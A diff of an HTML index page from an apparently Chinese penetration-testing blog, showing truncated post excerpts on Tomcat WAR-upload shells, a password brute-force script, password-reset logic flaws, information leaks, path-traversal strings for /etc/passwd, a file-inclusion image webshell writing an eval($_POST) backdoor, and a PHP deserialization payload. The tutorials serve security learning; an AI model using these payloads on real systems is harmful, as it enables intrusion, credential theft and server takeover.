@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+	<meta name="generator" content="Hugo 0.21-DEV" />
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Reber's Blog - 漏洞挖掘|渗透测试|python|php </title>
@@ -50,24 +51,6 @@
         <a href="/"><img src='/img/logo.png' width='70px'></a>
     </h1>
     <ul class="nav">
-        
-            
-                <li>
-                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
-            
-                </li>
         
     </ul>
 </div>
@@ -119,7 +102,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 关于War包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。 0x01 上传War包GetShell 找到后台猜密码然后登录 上传War包 先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包 0x02漏洞防御 后台使用强密码 删除Tomcat下的manager文件夹 0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &quot;&quot;&quot; def get_username(userfile): username = [] with open(userfile, 'r') as f: lines = f.readlines() for line in lines: username.append(line.strip()) return username def get_pwd(passfile): password = []
+        0x00 关于War包  War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。   0x01 上传War包GetShell  找到后台猜密码然后登录  上传War包
+先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包   0x02漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码  #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &quot;&quot;&quot; def get_username(userfile): username = [] with open(userfile, 'r') as f: lines = f.
     </p>
 
     
@@ -172,7 +156,11 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x01 CGI协议 中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议 0x02 FastCGI 服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低 fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等 0x03 FastCGI工作流程 一般情况下，FastCGI的整个工作流程是这样的： Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。 0x04 PHP-FPM php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露
+         0x01 CGI协议  中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议
+ 0x02 FastCGI  服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低
+fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等
+ 0x03 FastCGI工作流程  一般情况下，FastCGI的整个工作流程是这样的：
+  Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。  0x04 PHP-FPM  php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露  
     </p>
 
     
@@ -221,7 +209,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 示例一 0x01 示例二
+         0x00 示例一   0x01 示例二   
     </p>
 
     
@@ -270,7 +258,9 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。 0x01 密码找回漏洞 测试流程 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测 分类 邮箱找回 一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码 手机短信找回 短信找回一般就是4位或6位验证码，暴力猜测吧 找回逻辑错误 若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码 直接修改密码 在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改 本地验证 随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可 服务端将验证码返回给浏览器 在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可 验证码直接出现在url中 当点击获取验证码时发出的请求链接中直接有code 密保问题找回 回答密保问题，有时一些答案就在html源码里 0x02 多线程条件竞争漏洞 多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的, 若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。 文件上传 服务端可以sudo apt-get install inotify-tools安装监听文件的软件， 执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化 //uploads.php代码如下，仅供测试： &lt;meta charset='utf-8'&gt; &lt;?php $allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); $size = 10000000; $path = &quot;./uploads/&quot;; $filename = $_FILES['myfile']['name']; if (is_uploaded_file($_FILES['myfile']['tmp_name'])){ if (!move_uploaded_file($_FILES['myfile']['tmp_name'],$path.$filename)){ die(&quot;error:can not move!&quot;);
+        0x00 逻辑漏洞  逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。   0x01 密码找回漏洞  测试流程
+ 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测  分类
+ 邮箱找回   一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码    手机短信找回   短信找回一般就是4位或6位验证码，暴力猜测吧    找回逻辑错误   若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码    直接修改密码    在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改    本地验证   随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可    服务端将验证码返回给浏览器    在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可    验证码直接出现在url中   当点击获取验证码时发出的请求链接中直接有code    密保问题找回   回答密保问题，有时一些答案就在html源码里    0x02 多线程条件竞争漏洞  多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的,
     </p>
 
     
@@ -323,7 +313,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify 0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他 0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等 0x03 第三方软件应用
+        0x00 软件敏感信息  * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify   0x01 Web敏感信息  * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他   0x02 网络信息泄露  * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等   0x03 第三方软件应用  * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件   0x04 敏感信息搜集工具  https://github.
     </p>
 
     
@@ -376,7 +366,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件 不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞 0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容 0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞 0x03 任意文件读取 代码形式可如下几种： &lt;?php $filename = &quot;test.txt&quot;; readfile($filename); ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $data = file_get_contents($filename); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt; 0x04 任意文件下载 直接下载： &lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt; 用header()下载： &lt;?php $filename = &quot;uploads/201607141437284653.jpg&quot;; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); readfile($filename); ?&gt; 0x05 漏洞利用代码 readfile.php?file=/etc/passwd readfile.php?file=../../../../../../../../etc/passwd readfile.php?file=../../../../../../../../etc/passwd%00 0x06 Google search inurl:&quot;readfile.php?file=&quot; inurl:&quot;read.php?filename=&quot; inurl:&quot;download.php?file=&quot; inurl:&quot;down.php?file=&quot; 等等...
+        0x00 漏洞介绍  一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件 不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞   0x01 利用条件  * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容   0x02 漏洞危害  下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞   0x03 任意文件读取  代码形式可如下几种：
+&lt;?php $filename = &quot;test.txt&quot;; readfile($filename); ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?&gt; &lt;?php $filename = &quot;test.txt&quot;; $data = file_get_contents($filename); echo &quot;&lt;pre&gt;&quot;; print_r(htmlspecialchars($data)); echo &quot;&lt;/pre&gt;&quot;; ?
     </p>
 
     
@@ -429,7 +420,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件， 而无需再次编写，这中文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用， 但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多, 而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。 在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。 0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含 0x02 利用条件 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量 注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径 0x03 漏洞危害 执行任意代码 包含恶意文件控制网站 甚至控制服务器 0x04 漏洞分类 本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码 上传图片马，然后包含 读敏感文件，读PHP文件 包含日志文件GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件 远程文件包含：可以直接执行任意代码 要保证php.ini中allow_url_fopen和allow_url_include要为On 0x05 漏洞挖掘 上AWVS吧，骚年... 0x06 本地包含 示例一 &lt;?php if (@$_GET['page']) { include($_GET['page']); } else { include &quot;show.php&quot;; } ?&gt; 示例二 &lt;?php if (@$_GET['page']) { include(&quot;./action/&quot;.$_GET['page']); } else { include &quot;./action/show.php&quot;; } ?&gt; %00截断包含(PHP&lt;5.3.4 and magic_quotes_gpc=off) &lt;?php if (@$_GET['page']) { include &quot;./action/&quot;.$_GET['page'].&quot;.php&quot;; echo &quot;./action/&quot;.$_GET['page'].&quot;.php&quot;; } else { include &quot;./action/show.php&quot;; } ?&gt; 还有一个路径长度截断，Linux可以用./或/截断，需要文件名长度大于4096，Windows可以 用\.或./或\或/截断，需要大于256，是否能成功截断有多方面原因，可以说是靠运气的 示例四 上传图片马，马包含的代码为&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[xxser]);?&gt;&quot;)?&gt;， 上传后图片路径为/uploadfile/201643.jpg，当访问 http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时， 将会在fi这个文件夹下生成shell.php,内容为&lt;?php eval($_POST[xxser]);?&gt; 读敏感文件 可读如下敏感文件： Windows： C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 ...
+        0x00 文件包含   程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件， 而无需再次编写，这中文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用， 但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多, 而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。 在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。   0x01 常见文件包含函数  include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含   0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量   注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径   0x03 漏洞危害  执行任意代码 包含恶意文件控制网站 甚至控制服务器   0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码 上传图片马，然后包含 读敏感文件，读PHP文件 包含日志文件GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件 远程文件包含：可以直接执行任意代码 要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS吧，骚年...   0x06 本地包含  示例一   &lt;?php if (@$_GET['page']) { include($_GET['page']); } else { include &quot;show.
     </p>
 
     
@@ -482,7 +473,12 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串 反序列化：使用函数unserialize()可将序列化的字符串还原 若服务端有如下代码： &lt;?php class foo{ public $file = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct(){ file_put_contents($this-&gt;file,$this-&gt;data); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&gt; 客户端可构造如下代码生成序列化后的字符串提交给服务端， 服务端就会生成文件xx.php，内容为&lt;?php phpinfo(); ?&gt;： &lt;?php class foo { public $ﬁle = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct() { ﬁle_put_contents($this-&gt;ﬁle, $this-&gt;data); } } $f = new foo(); $f-&gt;ﬁle = &quot;xx.php&quot;; $f-&gt;data = &quot;&lt;?php phpinfo(); ?&gt;&quot;; echo base64_encode(serialize($f));
+        0x00 关于反序列化漏洞  序列化：使用函数serialize()可将实例序列化为字符串
+反序列化：使用函数unserialize()可将序列化的字符串还原
+若服务端有如下代码：
+&lt;?php class foo{ public $file = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct(){ file_put_contents($this-&gt;file,$this-&gt;data); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&gt;  客户端可构造如下代码生成序列化后的字符串提交给服务端，
+服务端就会生成文件xx.php，内容为&lt;?php phpinfo(); ?&gt;：
+&lt;?php class foo { public $ﬁle = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct() { ﬁle_put_contents($this-&gt;ﬁle, $this-&gt;data); } } $f = new foo(); $f-&gt;ﬁle = &quot;xx.php&quot;; $f-&gt;data = &quot;&lt;?php phpinfo(); ?
     </p>
 
     
@@ -535,7 +531,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时， 没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。 0x01 相关函数 PHP：eval assert Python：exec asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能 0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组 array( //这个是字符串形式的数组，它并不是数组，而是字符串 'upload_maxsize' =&gt; '2048', 'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 'watermark_enable' =&gt; '1', 'watermark_minwidth' =&gt; '300', 'watermark_minheight' =&gt; '300', 'watermark_img' =&gt; '/statics/img/water/mark.png', 'watermark_pct' =&gt; '85', 'watermark_quality' =&gt; '80', 'watermark_pos' =&gt; '9', ) function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == '') return array(); @eval(&quot;\$array = $data;&quot;); return $array; } 0x03 漏洞危害 执行代码 让网站写shell 甚至控制服务器 0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace
+        0x00 代码执行  当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时， 没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。   0x01 相关函数  PHP：eval assert Python：exec asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能   0x02 phpcms中的string2array函数  这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
+array( //这个是字符串形式的数组，它并不是数组，而是字符串 'upload_maxsize' =&gt; '2048', 'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 'watermark_enable' =&gt; '1', 'watermark_minwidth' =&gt; '300', 'watermark_minheight' =&gt; '300', 'watermark_img' =&gt; '/statics/img/water/mark.png', 'watermark_pct' =&gt; '85', 'watermark_quality' =&gt; '80', 'watermark_pos' =&gt; '9', )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == '') return array(); @eval(&quot;\$array = $data;&quot;); return $array; }   0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器   0x04 漏洞分类(也是利用点)  执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)   0x05 漏洞挖掘  框架找漏洞，如ThinkPHP： inurl:index.
     </p>
 
     
@@ -588,7 +585,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 环境 在windows下用Shadowsocks和Proxifier实现全局代理： System：Windows10 Pro x64 Shadowsocks：Shadowsocks v2.5.2.0 Proxifier：Proxifier Portable Edition v3.29 0x01 配置Shadowsocks 0x02 配置Proxifier Proxifier添加代理服务 Proxifier添加规则 测试全局代理设置成功与否
+         0x00 环境  在windows下用Shadowsocks和Proxifier实现全局代理：
+System：Windows10 Pro x64 Shadowsocks：Shadowsocks v2.5.2.0 Proxifier：Proxifier Portable Edition v3.29   0x01 配置Shadowsocks   0x02 配置Proxifier  Proxifier添加代理服务  Proxifier添加规则  测试全局代理设置成功与否   
     </p>
 
     
